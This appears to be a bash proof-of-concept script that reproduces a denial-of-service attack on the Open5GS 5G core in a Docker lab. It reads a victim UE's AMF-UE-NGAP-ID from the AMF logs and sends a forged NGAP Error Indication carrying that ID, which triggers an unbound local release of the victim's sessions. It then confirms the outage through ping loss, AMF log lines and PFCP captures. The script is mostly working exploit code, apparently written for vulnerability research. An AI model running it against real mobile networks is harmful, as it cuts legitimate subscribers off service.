#!/usr/bin/env bash
# ==========================================================================
# STRICT reproduction of T03 — Open5GS Error Indication -> unbound local release
# ==========================================================================
# Source fact (ngap-handler.c): the Error Indication handler finds ran_ue by
# AMF-UE-NGAP-ID with NO gnb-binding guard (:5358) and then does a LOCAL RELEASE
# — deactivate-all-sessions (:5429) + ran_ue_remove (:5437). (Contrast: proc 42
# UEContextReleaseRequest IS bound at :1784.) The earlier pcap sent the message
# but showed no deactivation, because the forged ID had not hit an active victim.
# This script closes that gap:
#   1. guarantees a fresh, REGISTERED, ACTIVELY-PINGING victim (aborts if not),
#   2. reads the victim's CURRENT AMF-UE-NGAP-ID,
#   3. measures victim ping loss across the attack window,
#   4. reads NEW AMF log lines for 'Performing local release' vs 'does not belong',
#      and decodes PFCP for a Session Modification/Deletion (UP deactivation),
#   5. prints an explicit PASS / PARTIAL / FAIL verdict.
# Uses the fixed builder (cause = radioNetwork/unknown-local-UE-NGAP-ID).
# Overwrites pcap/open5gs_T03_error_indication_release/ in place.
#
# Run from ngap_tester/ with Docker + the net-5glab Open5GS stack. Git Bash / bash.
set -uo pipefail
cd "$(dirname "$0")"

DIR="open5gs_T03_error_indication_release"
AMF="o5gs-amf"; SMF="o5gs-smf"
UE="ueransim-open5gs-ueransim-ue-1"
GNB="ueransim-open5gs-ueransim-gnb-1"
PING_IF="uesimtun0"
POST=30
ABS="$(pwd)/pcap/$DIR"

log(){ echo -e "\033[1;36m[t03]\033[0m $*"; }
die(){ echo -e "\033[1;31m[t03][ABORT]\033[0m $*"; exit 2; }
tsh(){ MSYS_NO_PATHCONV=1 docker run --rm -v "$ABS:/cap" nicolaka/netshoot tshark "$@" 2>/dev/null; }
num(){ local x="$1"; [[ "$x" =~ ^[0-9]+$ ]] && echo "$x" || echo "-1"; }

# 1. Core + RAN up --------------------------------------------------------
log "ensuring Open5GS + RAN are up ..."
( cd ../5g-lab && ./scripts/core.sh up open5gs && ./scripts/ran.sh up ueransim open5gs ) || true

# 2. Fresh, registered, ACTIVE victim ------------------------------------
log "restarting victim UE for a fresh registration ..."
docker restart "$UE" >/dev/null || die "cannot restart UE '$UE'"
sleep 12

log "baseline connectivity check — victim MUST be online or the test is void ..."
BASE=$(num "$(docker exec "$UE" ping -I "$PING_IF" -c 5 -W 2 8.8.8.8 2>/dev/null \
        | grep -oE '[0-9]+% packet loss' | grep -oE '^[0-9]+')")
log "baseline packet loss: ${BASE}%"
{ [ "$BASE" -lt 0 ] || [ "$BASE" -ge 60 ]; } && \
  die "victim not active before attack (baseline loss ${BASE}%). Fix UE / PDU session first."

# 3. Mark the AMF log, then read the CURRENT victim AMF-UE-NGAP-ID --------
LOGMARK=$(docker logs "$AMF" 2>&1 | wc -l | tr -d ' ')
V=$(docker logs "$AMF" 2>&1 | grep -oE 'AMF_UE_NGAP_ID\[[0-9]+\]' | tail -1 | grep -oE '[0-9]+')
[ -z "${V:-}" ] && die "could not read victim AMF-UE-NGAP-ID from AMF logs"
log "victim AMF-UE-NGAP-ID = $V   (AMF log mark @ line $LOGMARK)"

# 4. Continuous victim ping across the whole window (background) ----------
log "starting victim ping across attack window ..."
docker exec "$UE" ping -I "$PING_IF" -c 70 -i 0.5 -W 2 8.8.8.8 >/tmp/t03_ping.log 2>&1 &
PING_PID=$!
trap 'kill $PING_PID 2>/dev/null' EXIT

# 5. Capture + fire (fixed builder: cause=unknown-local-UE-NGAP-ID) -------
CFG_CORE=open5gs ./capture_attack.sh "$DIR" "$AMF" "$SMF" "$GNB" net-5glab "$POST" \
    -- error-indication --amf-ue-id "$V" --ran-ue-id 99

# 6. Stop ping, compute loss ---------------------------------------------
wait $PING_PID 2>/dev/null
trap - EXIT
LOSS=$(num "$(grep -oE '[0-9]+% packet loss' /tmp/t03_ping.log | grep -oE '^[0-9]+' | tail -1)")
log "victim ping loss across window: ${LOSS}%  (baseline ${BASE}%)"
log "ping tail:"; tail -12 /tmp/t03_ping.log | sed 's/^/    /'

# 7. AMF-log + PFCP evidence (only NEW log lines after the mark) ----------
NEWLOG=$(docker logs "$AMF" 2>&1 | tail -n +$((LOGMARK+1)))
RELEASE=$(echo "$NEWLOG"  | grep -c 'Performing local release')
NOTBELONG=$(echo "$NEWLOG"| grep -c 'does not belong')
PFCP_MOD=$(tsh -r /cap/smf_sbi_pfcp.pcap -Y "pfcp.msg_type==54 or pfcp.msg_type==56" -T fields -e frame.number | grep -c .)
echo "$NEWLOG" | grep -iE 'ErrorIndication|local release|deactivate|No RAN UE|does not belong' | tail -8 | sed 's/^/    [amf] /'

# 8. Verdict --------------------------------------------------------------
echo   "----------------------------------------------------------------"
echo   "  T03 Open5GS — STRICT RESULT"
echo   "  victim AMF-UE-NGAP-ID           : $V"
echo   "  baseline / window loss          : ${BASE}% -> ${LOSS}%"
echo   "  AMF 'Performing local release'  : $RELEASE"
echo   "  AMF 'does not belong' (rejected): $NOTBELONG"
echo   "  PFCP SessMod/Del (type 54/56)   : $PFCP_MOD"
if [ "$RELEASE" -ge 1 ] && [ "$LOSS" -ge 50 ]; then
  echo "  VERDICT: PASS    — AMF did the unbound local release AND victim lost service"
elif [ "$RELEASE" -ge 1 ]; then
  echo "  VERDICT: PARTIAL — AMF released locally, but ping loss weak (check UP deactivation / self-heal timing)"
elif [ "$NOTBELONG" -ge 1 ]; then
  echo "  VERDICT: FAIL    — AMF rejected with 'does not belong' (unexpected: error-ind path should be unbound)"
else
  echo "  VERDICT: FAIL    — no local release seen; likely ID/state precondition not met"
fi
echo   "  pcap updated: pcap/$DIR/"
echo   "----------------------------------------------------------------"
